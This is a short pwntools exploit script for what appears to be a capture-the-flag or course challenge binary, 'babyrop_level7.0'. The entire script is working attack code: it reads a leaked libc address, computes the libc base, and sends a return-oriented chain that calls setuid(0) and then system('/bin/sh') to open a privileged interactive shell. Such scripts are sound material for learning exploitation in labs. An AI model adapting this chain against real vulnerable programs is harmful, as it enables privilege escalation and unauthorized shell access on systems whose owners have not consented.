from pwn import *

elf = context.binary = ELF('/challenge/babyrop_level7.0')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

offset = 40

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

#leak
p.recvuntil(b'libc is:')
out = p.recv().split(b'.')[0]
system_leak = int(out[1::],16)

system_offset = libc.sym.system
libc_base = system_leak - system_offset
log.info(f'leak libc system : {hex(system_leak)}')
log.info(f'leak libc base   : {hex(libc_base)}')

#ret2plt
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + system_offset
setuid = libc_base + libc.symbols['setuid']
offset = 136
payload = b'A'*offset
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid)
payload += p64(pop_rdi)
payload += p64(bin_sh)
# payload += p64(ret)
payload += p64(system)

p.sendline(payload)
p.interactive()
